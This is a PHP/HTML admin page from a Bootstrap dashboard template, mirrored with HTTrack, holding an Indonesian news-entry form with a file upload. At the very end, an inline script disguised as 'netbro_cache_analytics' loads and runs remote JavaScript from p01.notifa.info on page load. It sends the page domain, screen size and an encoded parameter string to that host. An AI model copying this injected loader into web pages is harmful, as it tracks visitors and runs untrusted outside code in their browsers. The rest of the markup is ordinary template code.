<?php ?>

<!doctype html>
<html lang="en">


<!-- Mirrored from demo.riktheme.com/amfan/side-menu-2/project-details.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 06 Jun 2020 02:13:59 GMT -->
<head>
    <meta charset="UTF-8">
    <meta name="description" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <!-- The above 4 meta tags *must* come first in the head; any other head content must come *after* these tags -->

    <!-- Title -->
    <title>Amfan - Responsive Bootstrap Admin &amp; Dashboard Template</title>

    <!-- Favicon -->
    <link rel="icon" href="<?= BASEURL;?>/AssetAdmin/img/core-img/favicon.png">

    <!-- These plugins only need for the run this page -->
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/default-assets/notification.css">
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/c3.min.css">

    <!-- Master Stylesheet [If you remove this CSS file, your file will be broken undoubtedly.] -->
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/material-design-iconic-font.min.css">
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/style.css">
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/style1.css">
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/font-awesome.min.css">
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/default-assets/themify-icons.css">
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/dropzone.min.css">
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/default-assets/dropify.min.css">
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/default-assets/fileupload.css">
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/default-assets/notification.css">
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/default-assets/daterange-picker.css">
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/bootstrap-datepicker.min.css">
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/default-assets/form-picker.css">
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/default-assets/color-picker-bootstrap.css">
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/default-assets/jquery.bootstrap-touchspin.min.css">

    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/bootstrap-colorpicker.min.css">
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/default-assets/select2.min.css">


</head>

<body>
<!-- Preloader -->
<div id="droba-loader">
    <div class="loader"></div>
</div>
<!--Preloader-->

<!-- Setting Panel -->
<div class="theme-setting-wrapper">
    <div id="settings-trigger"><i class="ti-settings font-17"></i></div>
    <div id="theme-settings" class="settings-panel">
        <i class="settings-close zmdi zmdi-close font-18 font-weight-bold"></i>
        <p class="settings-heading font-18">Side Menu Color :</p>
        <div class="sidebar-bg-options selected" id="sidebar-dark-theme">
            <div><span class="font-14 font-weight-bold">Default</span></div>
        </div>
        <div class="sidebar-bg-options" id="sidebar-light-theme">
            <div><span class="font-14 font-weight-bold">Light</span></div>
        </div>
        <div class="sidebar-bg-options" id="sidebar-color-theme">
            <div><span class="font-14 font-weight-bold">Colorfull</span></div>
        </div>
    </div>
</div>

<!-- ======================================
******* Page Wrapper Area Start **********
======================================= -->
<div class="ecaps-page-wrapper">
    <!-- Sidemenu Area -->
    <div class="ecaps-sidemenu-area">
        <!-- Desktop Logo -->
        <div class="ecaps-logo">
            <a href="index.html"><img class="desktop-logo" src="<?= BASEURL;?>/AssetAdmin/img/core-img/logo.png" alt="Desktop Logo"> <img class="small-logo" src="<?= BASEURL;?>/AssetAdmin/img/core-img/small-logo.png" alt="Mobile Logo"></a>
        </div>

        <!-- Side Nav -->
        <div class="ecaps-sidenav" id="ecapsSideNav">
            <!-- Side Menu Area -->
            <div class="side-menu-area">
                <!-- Sidebar Menu -->
                <nav>
                    <ul class="sidebar-menu" data-widget="tree">
                        <li><a href="<?= BASEURL;?>/homeadmin"><i class="zmdi zmdi-view-dashboard"></i><span>Dashboard</span></a></li>
                        <li class="treeview active">
                            <a href="javascript:void(0)"><i class="zmdi zmdi-apps"></i> <span>Apps</span> <i class="fa fa-angle-right"></i></a>
                            <ul class="treeview-menu">
                                <li><a href="<?= BASEURL;?>/buatakun">Data Akun</a></li>
                                <li class="active"><a href="#">Data Berita</a></li>
                            </ul>
                        </li>

                    </ul>
                </nav>
            </div>
        </div>
    </div>

    <!-- Page Content -->
    <div class="ecaps-page-content">
        <!-- Top Header Area -->
        <header class="top-header-area d-flex align-items-center justify-content-between">
            <div class="left-side-content-area d-flex align-items-center">
                <!-- Mobile Logo -->
                <div class="mobile-logo mr-3 mr-sm-4">
                    <a href="index.html"><img src="<?= BASEURL;?>/AssetAdmin/img/core-img/small-logo.png" alt="Mobile Logo"></a>
                </div>

                <!-- Triggers -->
                <div class="ecaps-triggers mr-1 mr-sm-3">
                    <div class="menu-collasped" id="menuCollasped">
                        <i class="zmdi zmdi-menu"></i>
                    </div>
                    <div class="mobile-menu-open" id="mobileMenuOpen">
                        <i class="zmdi zmdi-menu"></i>
                    </div>
                </div>

                <!-- Left Side Nav -->
                <ul class="left-side-navbar d-flex align-items-center">
                    <li class="hide-phone app-search">
                        <form class="input-group" role="search">
                            <input type="text" class="form-control" placeholder="Search Projects.." aria-label="search">
                        </form>
                    </li>
                </ul>
            </div>

            <div class="right-side-navbar d-flex align-items-center justify-content-end">
                <!-- Mobile Trigger -->
                <div class="right-side-trigger" id="rightSideTrigger">
                    <i class="ti-align-left"></i>
                </div>

                <!-- Top Bar Nav -->
                <ul class="right-side-content d-flex align-items-center">
                    <!-- Full Screen Mode -->
                    <li class="full-screen-mode ml-1">
                        <a href="javascript:" id="fullScreenMode"><i class="zmdi zmdi-fullscreen"></i></a>
                    </li>
                    <li class="nav-item dropdown">
                        <button type="button" class="btn dropdown-toggle font-15 text-dark" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">English<i class="arrow_carrot-down"></i></button>
                        <div class="dropdown-menu language-dropdown dropdown-menu-right">
                            <a href="#" class="dropdown-item">French</a>
                            <a href="#" class="dropdown-item">German</a>
                            <a href="#" class="dropdown-item">Hindi</a>

                        </div>
                    </li>

                    <li class="nav-item dropdown">
                        <button type="button" class="btn dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"><i class="zmdi zmdi-shopping-basket" aria-hidden="true"></i></button>

                        <div class="dropdown-menu dropdown-menu-right">
                            <!-- Top Message Area -->
                            <div class="top-message-area">
                                <!-- Heading -->
                                <div class="top-message-heading">
                                    <div class="heading-title">
                                        <h6>Messages</h6>
                                    </div>
                                    <span>5 New</span>
                                </div>
                                <div class="message-box" id="messageBox">
                                    <a href="#" class="dropdown-item">
                                        <img src="<?= BASEURL;?>/AssetAdmin/img/member-img/1.png" alt="">
                                        <span class="message-text">
                                                <span>6-hour video course on Angular</span>
                                                <span>3 min ago</span>
                                            </span>
                                    </a>
                                    <a href="#" class="dropdown-item">
                                        <img src="<?= BASEURL;?>/AssetAdmin/img/member-img/2.png" alt="">
                                        <span class="message-text">
                                                <span>Google Ads: You'll get a refund soon</span>
                                                <span>27 min ago</span>
                                            </span>
                                    </a>
                                    <a href="#" class="dropdown-item">
                                        <img src="<?= BASEURL;?>/AssetAdmin/img/member-img/3.png" alt="">
                                        <span class="message-text">
                                                <span>New Feature: HTTP Method Selection</span>
                                                <span>56 min ago</span>
                                            </span>
                                    </a>
                                    <a href="#" class="dropdown-item">
                                        <img src="<?= BASEURL;?>/AssetAdmin/img/member-img/4.png" alt="">
                                        <span class="message-text">
                                                <span>The Complete JavaScript Handbook</span>
                                                <span>1 hour ago</span>
                                            </span>
                                    </a>
                                    <a href="#" class="dropdown-item">
                                        <img src="<?= BASEURL;?>/AssetAdmin/img/member-img/5.png" alt="">
                                        <span class="message-text">
                                                <span>New comment: ecaps Template</span>
                                                <span>2 days ago</span>
                                            </span>
                                    </a>
                                    <a href="#" class="dropdown-item">
                                        <img src="<?= BASEURL;?>/AssetAdmin/img/member-img/6.png" alt="">
                                        <span class="message-text">
                                                <span>6-hour video course on Angular</span>
                                                <span>3 min ago</span>
                                            </span>
                                    </a>
                                    <a href="#" class="dropdown-item">
                                        <img src="<?= BASEURL;?>/AssetAdmin/img/member-img/7.png" alt="">
                                        <span class="message-text">
                                                <span>Google Ads: You'll get a refund soon</span>
                                                <span>27 min ago</span>
                                            </span>
                                    </a>
                                    <a href="#" class="dropdown-item">
                                        <img src="<?= BASEURL;?>/AssetAdmin/img/member-img/8.html" alt="">
                                        <span class="message-text">
                                                <span>New Feature: HTTP Method Selection</span>
                                                <span>56 min ago</span>
                                            </span>
                                    </a>
                                </div>
                            </div>
                        </div>
                    </li>

                    <li class="nav-item dropdown">
                        <button type="button" class="btn dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"><i class="zmdi zmdi-volume-up" aria-hidden="true"></i> <span class="active-status"></span></button>
                        <div class="dropdown-menu dropdown-menu-right">
                            <!-- Top Notifications Area -->
                            <div class="top-notifications-area">
                                <!-- Heading -->
                                <div class="notifications-heading">
                                    <div class="heading-title">
                                        <h6>Notifications</h6>
                                    </div>
                                    <span>5 New</span>
                                </div>

                                <div class="notifications-box" id="notificationsBox">
                                    <a href="#" class="dropdown-item"><i class="ti-face-smile bg-success"></i><span>We've got something for you!</span></a>
                                    <a href="#" class="dropdown-item"><i class="zmdi zmdi-notifications-active bg-danger"></i><span>Domain names expiring on Tuesday</span></a>
                                    <a href="#" class="dropdown-item"><i class="ti-check"></i><span>Your commissions has been sent</span></a>
                                    <a href="#" class="dropdown-item"><i class="ti-heart bg-success"></i><span>You sold an item!</span></a>
                                    <a href="#" class="dropdown-item"><i class="ti-bolt bg-warning"></i><span>Security alert for your linked Google account</span></a>
                                    <a href="#" class="dropdown-item"><i class="ti-face-smile bg-success"></i><span>We've got something for you!</span></a>
                                    <a href="#" class="dropdown-item"><i class="zmdi zmdi-notifications-active bg-danger"></i><span>Domain names expiring on Tuesday</span></a>
                                    <a href="#" class="dropdown-item"><i class="ti-check"></i><span>Your commissions has been sent</span></a>
                                    <a href="#" class="dropdown-item"><i class="ti-heart bg-success"></i><span>You sold an item!</span></a>
                                    <a href="#" class="dropdown-item"><i class="ti-bolt bg-warning"></i><span>Security alert for your linked Google account</span></a>
                                </div>
                            </div>
                        </div>
                    </li>

                    <li class="nav-item dropdown">
                        <button type="button" class="btn dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"><img src="img/member-img/3.png" alt=""></button>
                        <div class="dropdown-menu dropdown-menu-right">
                            <!-- User Profile Area -->
                            <div class="user-profile-area">
                                <div class="user-profile-heading">
                                    <!-- Thumb -->
                                    <div class="profile-img">
                                        <img class="chat-img mr-2" src="<?= BASEURL;?>/AssetAdmin/<?= BASEURL;?>/AssetAdmin/img/member-img/3.png" alt="">
                                    </div>
                                    <!-- Profile Text -->
                                    <div class="profile-text">
                                        <h6>Ajoy Das</h6>
                                        <span>Developer</span>
                                    </div>
                                </div>
                                <a href="#" class="dropdown-item"><i class="zmdi zmdi-account profile-icon bg-primary" aria-hidden="true"></i> My profile</a>
                                <a href="#" class="dropdown-item"><i class="zmdi zmdi-email-open profile-icon bg-success" aria-hidden="true"></i> Messages</a>
                                <a href="#" class="dropdown-item"><i class="zmdi zmdi-brightness-7 profile-icon bg-info" aria-hidden="true"></i> Account settings</a>
                                <a href="#" class="dropdown-item"><i class="zmdi zmdi-mouse profile-icon bg-danger" aria-hidden="true"></i> My Tasks</a>
                                <a href="#" class="dropdown-item"><i class="zmdi zmdi-wifi-alt profile-icon bg-purple" aria-hidden="true"></i> Support</a>
                                <a href="#" class="dropdown-item"><i class="ti-unlink profile-icon bg-warning" aria-hidden="true"></i> Sign-out</a>
                            </div>
                        </div>
                    </li>
                </ul>
            </div>
        </header>

        <!-- Main Content Area -->
        <?php  ?>
        <div class="main-content">
            <div class="container-fluid">
                <div class="rowcol-12 box-margin">
                    <div class="contact-form-area">
                        <div class="card">
                            <div class="card-body">
                                    <h4 class="card-title">Form Berita</h4>
                                    <div class="container">
                                        <form action="<?=BASEURL;?>/page/buatberita" method="post" enctype="multipart/form-data">

                                            <label for="fname2">Judul</label>
                                            <input type="text" id="fname2" name="judul" placeholder="Judul Berita..">

                                            <label>Tanggal</label>
                                            <input type="text" name="tanggal" class="form-control" data-provide="datepicker" data-date-autoclose="true">

                                            <label for="lname2">Sinopsis</label>
                                            <input type="text" id="lname2" name="sinop" placeholder="Sinopsis..">

                                            <label for="subject">Isi Berita</label>
                                            <textarea id="subject" name="isi"  placeholder="Write something.." style="height:100px"></textarea>

                                            <div class="container-fluid">
                                                <div class="row">
                                                    <div class="col-12 box-margin">
                                                        <div class="card">
                                                            <div class="card-body">
                                                                <h4 class="card-title mb-1">Dropzone File Upload</h4>
                                                                <br>
                                                                <div class="fallback">
                                                                    <input name="file" type="file"  />
                                                                </div>

                                                                <div class="dz-message needsclick">
                                                                    <i class="h1 text-muted dripicons-cloud-upload"></i>
                                                                </div>
                                                            </div> <!-- end card-body-->
                                                        </div> <!-- end card-->
                                                    </div>
                                                </div>
                                                <!-- end row -->
                                            </div>

                                            <input class="btn btn-primary btn-block mt-15" type="submit" value="Submit">

                                        </form>
                                    </div>
                                </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- ======================================
********* Page Wrapper Area End ***********
======================================= -->

<!-- Must needed plugins to the run this Template -->
<script src="<?= BASEURL;?>/AssetAdmin/js/jquery.min.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/popper.min.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/bootstrap.min.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/bundle.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/setting.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/fullscreen.js"></script>

<!-- Active JS -->
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/active.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/bootstrap-growl.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/notification-active.js"></script>

<!-- These plugins only need for the run this page -->
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/am-chart.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/gauge.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/serial.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/light.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/ammap.min.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/worldlow.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/radar.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/widget-page-chart-active.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/bootstrap-growl.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/notification-active.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/file-upload.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/basic-form.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/dropzone.min.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/dropzone-custom.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/dropzone-and-module.min.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/bootstrap-datepicker.min.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/form-picker.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/select2.min.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/select2-custom.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/jquery.bootstrap-touchspin.custom.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/colorpicker-bootstrap.js"></script>



<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXqtyRNyMjONY5tJrzORfWG4Sp89uOtZRMFsW3G4L92o1wM6Ahql16pBzQxz%2brwY6WAIoXYO1rtuHXNSSTIA0sZsuMd09Z6aJszjSdcwllFkSs8xicbFApNJ4Aid%2fSkB5%2fiu8s4bqmE1k8ee1bd1PBPjTXvzV%2bbd7c%2bD1ruGDfiyKymRJoYWf2xgA9yPg3xyHu0XL2bEdQ%2bacbk7wRVmC%2fqv9F6t114M0su724cBwFM7Hm51Ep9zUHXLRMuITXIrCRP5lye2zSU4C0Bwfdp9ItvJaUDpMl3DkDqqoRWb9XYCsueT8C3TRCp0dykFFuaa0uTXwsE0d6vAURAzJVF%2fKPk1bAcb%2brmWdEkezwsXyxLB5ZMQpdBqcaWGIvvpYcupZSdxjlpPlqY8B2cM%2fl33d3WRoZ3JMTUMRGeuCwwUvkGKeEwVneRfTOZD8uqjS6WB1JEVLxv0ySeR4r4bTUeNVvvfL3L7MqpXJeCg8I2vUyleLnXePQ6MWLtNoBafhvP2PZ5lLOIVj1sc4%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>


<!-- Mirrored from demo.riktheme.com/amfan/side-menu-2/project-details.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 06 Jun 2020 02:14:00 GMT -->
</html>


